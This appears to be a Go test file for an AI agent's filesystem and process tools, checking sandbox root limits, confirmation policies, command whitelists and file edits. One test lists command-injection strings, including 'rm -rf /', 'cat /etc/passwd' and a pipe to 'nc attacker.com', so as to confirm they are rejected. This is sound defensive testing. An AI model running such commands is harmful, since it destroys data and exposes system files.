package tools

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// TestFileSystemToolRootRestriction verifies paths outside the sandbox root
// are rejected.
func TestFileSystemToolRootRestriction(t *testing.T) {
	root := t.TempDir()
	tool := NewFileSystemTool(root, false)
	tool.SetPolicy(Policy{Mode: ConfirmAlways})

	// Write inside the root — allowed.
	inside := filepath.Join(root, "ok.txt")
	res, err := tool.Execute(fmt.Sprintf(`{"action":"write","path":%q,"content":"hi"}`, inside))
	if err != nil {
		t.Fatalf("write inside root failed: %v", err)
	}
	if !strings.Contains(res, "Successfully wrote") {
		t.Fatalf("unexpected result: %q", res)
	}

	// Escape via ".." — rejected.
	outside := filepath.Join(root, "..", "escaped.txt")
	_, err = tool.Execute(fmt.Sprintf(`{"action":"write","path":%q,"content":"x"}`, outside))
	if err == nil || !strings.Contains(err.Error(), "outside root") {
		t.Fatalf("expected 'outside root' error, got %v", err)
	}

	// Absolute path outside root — rejected.
	_, err = tool.Execute(fmt.Sprintf(`{"action":"read","path":%q}`, filepath.Join(root, "..", "other.txt")))
	if err == nil || !strings.Contains(err.Error(), "outside root") {
		t.Fatalf("expected 'outside root' error, got %v", err)
	}
}

// TestFileSystemToolConfirmation verifies dangerous operations go through
// the confirmation policy.
func TestFileSystemToolConfirmation(t *testing.T) {
	root := t.TempDir()
	target := filepath.Join(root, "file.txt")

	// Policy: never — write must be denied.
	tool := NewFileSystemTool(root, false)
	tool.SetPolicy(Policy{Mode: ConfirmNever})
	_, err := tool.Execute(fmt.Sprintf(`{"action":"write","path":%q,"content":"x"}`, target))
	if err == nil || !strings.Contains(err.Error(), "not approved") {
		t.Fatalf("expected denial, got %v", err)
	}
	if _, statErr := os.Stat(target); !os.IsNotExist(statErr) {
		t.Fatalf("file must not be created, stat err: %v", statErr)
	}

	// Policy: ask with a denying approver — denied.
	tool.SetPolicy(Policy{Mode: ConfirmAsk, Ask: func(toolName, action, detail string) bool {
		return false
	}})
	if _, err := tool.Execute(fmt.Sprintf(`{"action":"write","path":%q,"content":"x"}`, target)); err == nil {
		t.Fatalf("expected denial via ask")
	}

	// Policy: ask with an approving approver — allowed.
	tool.SetPolicy(Policy{Mode: ConfirmAsk, Ask: func(toolName, action, detail string) bool {
		return true
	}})
	if _, err := tool.Execute(fmt.Sprintf(`{"action":"write","path":%q,"content":"x"}`, target)); err != nil {
		t.Fatalf("expected approval, got %v", err)
	}

	// Read is not dangerous — no confirmation needed, works with nil ask.
	tool.SetPolicy(Policy{Mode: ConfirmAsk, Ask: nil})
	if _, err := tool.Execute(fmt.Sprintf(`{"action":"read","path":%q}`, target)); err != nil {
		t.Fatalf("read must not require confirmation, got %v", err)
	}
}

// TestProcessToolWhitelist verifies only whitelisted commands can be executed.
func TestProcessToolWhitelist(t *testing.T) {
	tool := NewProcessTool(5*time.Second, []string{"go"}, false)
	tool.SetPolicy(Policy{Mode: ConfirmAlways})

	if _, err := tool.Execute(`{"action":"exec","command":"not-a-real-cmd-xyz"}`); err == nil ||
		!strings.Contains(err.Error(), "not allowed") {
		t.Fatalf("expected whitelist denial, got %v", err)
	}

	if _, err := tool.Execute(`{"action":"exec","command":"go","args":"version"}`); err != nil {
		t.Fatalf("whitelisted command failed: %v", err)
	}
}

// TestProcessToolDenyByDefault verifies an explicitly empty whitelist allows
// no commands at all.
func TestProcessToolDenyByDefault(t *testing.T) {
	tool := NewProcessTool(5*time.Second, []string{}, false)
	tool.SetPolicy(Policy{Mode: ConfirmAlways})

	_, err := tool.Execute(`{"action":"exec","command":"echo","args":"hi"}`)
	if err == nil || !strings.Contains(err.Error(), "no commands are allowed") {
		t.Fatalf("expected denial with empty whitelist, got %v", err)
	}
}

// TestManagerResultTruncation verifies oversized tool results are truncated.
func TestManagerResultTruncation(t *testing.T) {
	m := NewManager(t.TempDir(), []string{}, 50, "", false)

	big := strings.Repeat("x", 500)
	res, err := m.Execute("echo", fmt.Sprintf(`{"message":%q}`, big))
	if err != nil {
		t.Fatalf("Execute failed: %v", err)
	}
	if len(res) > 200 || !strings.Contains(res, "[output truncated]") {
		t.Fatalf("result not truncated: len=%d", len(res))
	}
}

// TestManagerConfirmationPolicy verifies SetPolicy reaches Confirmable tools.
func TestManagerConfirmationPolicy(t *testing.T) {
	m := NewManager(t.TempDir(), []string{}, 0, "", false)
	m.SetPolicy(Policy{Mode: ConfirmNever})

	// filesystem write is dangerous — must be denied by policy.
	root := t.TempDir()
	// Note: NewManager above created its own fs tool rooted at TempDir #1;
	// execute write to a path inside that root.
	fsRoot := ""
	// Recreate manager with explicit root for clarity.
	m = NewManager(root, []string{}, 0, "", false)
	m.SetPolicy(Policy{Mode: ConfirmNever})
	fsRoot = root

	_, err := m.Execute("filesystem",
		fmt.Sprintf(`{"action":"write","path":%q,"content":"x"}`, filepath.Join(fsRoot, "f.txt")))
	if err == nil || !strings.Contains(err.Error(), "not approved") {
		t.Fatalf("expected policy denial, got %v", err)
	}

	// With "always" mode the same operation succeeds.
	m.SetPolicy(Policy{Mode: ConfirmAlways})
	if _, err := m.Execute("filesystem",
		fmt.Sprintf(`{"action":"write","path":%q,"content":"x"}`, filepath.Join(fsRoot, "f.txt"))); err != nil {
		t.Fatalf("expected success in always mode, got %v", err)
	}
}

// TestCommandInjectionProtection verifies dangerous shell patterns are rejected.
func TestCommandInjectionProtection(t *testing.T) {
	tool := NewProcessTool(5*time.Second, []string{"echo"}, false)
	tool.SetPolicy(Policy{Mode: ConfirmAlways})

	injectionCases := []string{
		`{"action":"exec","command":"echo","args":"; rm -rf /"}`,
		`{"action":"exec","command":"echo","args":"&& cat /etc/passwd"}`,
		`{"action":"exec","command":"echo","args":"| nc attacker.com"}`,
		`{"action":"exec","command":"echo; cat /etc/passwd","args":""}`,
	}
	for _, tc := range injectionCases {
		_, err := tool.Execute(tc)
		if err == nil {
			t.Errorf("expected injection rejection for: %s", tc)
		} else if !strings.Contains(err.Error(), "dangerous pattern") {
			t.Errorf("injection error message unexpected for %s: %v", tc, err)
		}
	}
}

// TestFileReadSizeLimit verifies oversized files are rejected.
func TestFileReadSizeLimit(t *testing.T) {
	root := t.TempDir()
	tool := NewFileSystemTool(root, false)
	tool.SetPolicy(Policy{Mode: ConfirmAlways})

	// Create a file larger than MaxReadFileSize.
	largePath := filepath.Join(root, "large.bin")
	f, err := os.Create(largePath)
	if err != nil {
		t.Fatal(err)
	}
	// Write 65 MB.
	_, err = f.Write(make([]byte, MaxReadFileSize+1024))
	if err != nil {
		f.Close()
		t.Fatal(err)
	}
	if err := f.Close(); err != nil {
		t.Fatal(err)
	}

	_, err = tool.Execute(fmt.Sprintf(`{"action":"read","path":%q}`, "large.bin"))
	if err == nil {
		t.Fatal("expected file-too-large error")
	}
	if !strings.Contains(err.Error(), "too large") {
		t.Fatalf("unexpected error: %v", err)
	}

	// Explicitly remove the large file to avoid Windows cleanup issues.
	_ = os.Remove(largePath)
}

// TestCreateFile verifies file creation and error on existing file.
func TestCreateFile(t *testing.T) {
	root := t.TempDir()
	tool := NewFileSystemTool(root, false)
	tool.SetPolicy(Policy{Mode: ConfirmAlways})

	// Create a new file
	_, err := tool.Execute(fmt.Sprintf(`{"action":"create","path":%q,"content":"hello"}`, "test.txt"))
	if err != nil {
		t.Fatalf("create failed: %v", err)
	}

	// Try to create again — should fail
	_, err = tool.Execute(fmt.Sprintf(`{"action":"create","path":%q,"content":"hello"}`, "test.txt"))
	if err == nil {
		t.Fatal("expected error for existing file")
	}
	if !strings.Contains(err.Error(), "already exists") {
		t.Fatalf("unexpected error: %v", err)
	}
}

// TestAppendFile verifies appending to existing file.
func TestAppendFile(t *testing.T) {
	root := t.TempDir()
	tool := NewFileSystemTool(root, false)
	tool.SetPolicy(Policy{Mode: ConfirmAlways})

	// Create initial file
	_, err := tool.Execute(fmt.Sprintf(`{"action":"create","path":%q,"content":"line1\nline2\n"}`, "append.txt"))
	if err != nil {
		t.Fatalf("create failed: %v", err)
	}

	// Append to file
	_, err = tool.Execute(fmt.Sprintf(`{"action":"append","path":%q,"content":"line3\n"}`, "append.txt"))
	if err != nil {
		t.Fatalf("append failed: %v", err)
	}

	// Verify content
	data, err := os.ReadFile(filepath.Join(root, "append.txt"))
	if err != nil {
		t.Fatalf("read failed: %v", err)
	}
	if string(data) != "line1\nline2\nline3\n" {
		t.Fatalf("unexpected content: %q", string(data))
	}
}

// TestInsertLine verifies inserting at specific line.
func TestInsertLine(t *testing.T) {
	root := t.TempDir()
	tool := NewFileSystemTool(root, false)
	tool.SetPolicy(Policy{Mode: ConfirmAlways})

	// Create initial file
	_, err := tool.Execute(fmt.Sprintf(`{"action":"create","path":%q,"content":"first\nthird\n"}`, "insert.txt"))
	if err != nil {
		t.Fatalf("create failed: %v", err)
	}

	// Insert at line 2
	_, err = tool.Execute(fmt.Sprintf(`{"action":"insert","path":%q,"line":2,"content":"second"}`, "insert.txt"))
	if err != nil {
		t.Fatalf("insert failed: %v", err)
	}

	// Verify content
	data, err := os.ReadFile(filepath.Join(root, "insert.txt"))
	if err != nil {
		t.Fatalf("read failed: %v", err)
	}
	if string(data) != "first\nsecond\nthird" {
		t.Fatalf("unexpected content: %q", string(data))
	}
}

// TestReplaceText verifies text replacement.
func TestReplaceText(t *testing.T) {
	root := t.TempDir()
	tool := NewFileSystemTool(root, false)
	tool.SetPolicy(Policy{Mode: ConfirmAlways})

	// Create initial file
	_, err := tool.Execute(fmt.Sprintf(`{"action":"create","path":%q,"content":"hello world hello"}`, "replace.txt"))
	if err != nil {
		t.Fatalf("create failed: %v", err)
	}

	// Replace text
	_, err = tool.Execute(fmt.Sprintf(`{"action":"replace","path":%q,"search":"hello","replace":"hi"}`, "replace.txt"))
	if err != nil {
		t.Fatalf("replace failed: %v", err)
	}

	// Verify content
	data, err := os.ReadFile(filepath.Join(root, "replace.txt"))
	if err != nil {
		t.Fatalf("read failed: %v", err)
	}
	if string(data) != "hi world hi" {
		t.Fatalf("unexpected content: %q", string(data))
	}
}

// TestSearchFile verifies searching in file.
func TestSearchFile(t *testing.T) {
	root := t.TempDir()
	tool := NewFileSystemTool(root, false)
	tool.SetPolicy(Policy{Mode: ConfirmAlways})

	// Create initial file
	_, err := tool.Execute(fmt.Sprintf(`{"action":"create","path":%q,"content":"line one\nline two\nno match"}`, "search.txt"))
	if err != nil {
		t.Fatalf("create failed: %v", err)
	}

	// Search for pattern
	result, err := tool.Execute(fmt.Sprintf(`{"action":"search","path":%q,"search":"line"}`, "search.txt"))
	if err != nil {
		t.Fatalf("search failed: %v", err)
	}
	if !strings.Contains(result, "Found 2 matches") {
		t.Fatalf("unexpected result: %s", result)
	}
	if !strings.Contains(result, "1: line one") {
		t.Fatalf("missing match: %s", result)
	}
}

// TestSearchFileRegex verifies regex search in file.
func TestSearchFileRegex(t *testing.T) {
	root := t.TempDir()
	tool := NewFileSystemTool(root, false)
	tool.SetPolicy(Policy{Mode: ConfirmAlways})

	// Create initial file
	_, err := tool.Execute(fmt.Sprintf(`{"action":"create","path":%q,"content":"abc123\ndef456\nghi789"}`, "regex.txt"))
	if err != nil {
		t.Fatalf("create failed: %v", err)
	}

	// Search with regex
	result, err := tool.Execute(fmt.Sprintf(`{"action":"search","path":%q,"search":"\\d{3}"}`, "regex.txt"))
	if err != nil {
		t.Fatalf("regex search failed: %v", err)
	}
	if !strings.Contains(result, "Found 3 matches") {
		t.Fatalf("unexpected result: %s", result)
	}
}
